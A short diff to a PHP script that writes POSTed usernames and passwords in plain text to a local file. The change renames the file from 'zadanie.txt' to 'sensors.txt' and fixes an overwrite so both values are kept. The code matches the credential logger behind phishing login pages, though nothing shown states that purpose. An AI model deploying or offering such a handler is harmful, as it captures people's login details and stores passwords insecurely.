@@ -1,10 +1,8 @@
 <?php
     $Name = "username:".$_POST['username']."";
     $Pass = "password:".$_POST['password']."";
-    $file = fopen("zadanie.txt","w") or die("Unable to open file!");
+    $file = fopen("sensors.txt","w") or die("Unable to open file!");
     fwrite($file, $Name);
-    fclose($file);
-    $file = fopen("zadanie.txt","w") or die("Unable to open file!");
     fwrite($file, $Pass);
     fclose($file);
 ?>
